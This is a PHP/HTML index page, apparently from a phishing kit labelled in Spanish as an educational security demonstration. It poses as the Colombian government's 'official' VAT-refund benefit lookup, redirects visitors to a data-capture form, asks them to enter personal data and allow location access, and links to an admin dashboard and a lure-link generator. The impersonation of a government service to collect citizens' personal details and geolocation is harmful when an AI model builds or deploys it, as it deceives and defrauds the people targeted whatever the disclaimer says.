<?php
/**
 * Archivo de redirección principal
 * Redirige automáticamente al frontend del sistema de captura
 * 
 * Herramienta Educativa de Demostración de Riesgos de Seguridad
 * Uso exclusivo para fines educativos y de concienciación
 */

// Verificar si se está accediendo desde la raíz
if ($_SERVER['REQUEST_URI'] === '/' || $_SERVER['REQUEST_URI'] === '/index.php') {
    // Redireccionar al formulario de consulta de beneficio de devolución del IVA
    header('Location: /frontend/consulta_beneficio.html');
    exit();
}

// Si no es acceso directo, mostrar información básica
?><!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Consulta de Beneficio - Devolución del IVA</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            text-align: center;
            max-width: 500px;
        }
        .logo {
            font-size: 2.5rem;
            color: #667eea;
            margin-bottom: 1rem;
        }
        h1 {
            color: #333;
            margin-bottom: 1rem;
        }
        p {
            color: #666;
            line-height: 1.6;
            margin-bottom: 1.5rem;
        }
        .btn {
            display: inline-block;
            background: #667eea;
            color: white;
            padding: 12px 24px;
            text-decoration: none;
            border-radius: 5px;
            margin: 0.5rem;
            transition: background 0.3s;
        }
        .btn:hover {
            background: #5a6fd8;
        }
        .warning {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            color: #856404;
            padding: 1rem;
            border-radius: 5px;
            margin-top: 1rem;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🏛️</div>
        <h1>Consulta de Beneficio - Devolución del IVA</h1>
        <p>Sistema oficial del Gobierno Nacional de Colombia para la consulta del beneficio de devolución del IVA.</p>
        
        <a href="/frontend/consulta_beneficio.html" class="btn">Consultar Beneficio</a>
        <a href="/admin/dashboard.php" class="btn">Panel de Administración</a>
        <a href="/admin/link-generator.php" class="btn">Generar Enlaces</a>
        
        <div class="warning">
            <strong>ℹ️ Información Importante:</strong> Para consultar su beneficio de devolución del IVA, complete el formulario con sus datos personales y permita el acceso a su ubicación para mejorar la precisión del servicio.
        </div>
    </div>
</body>
</html>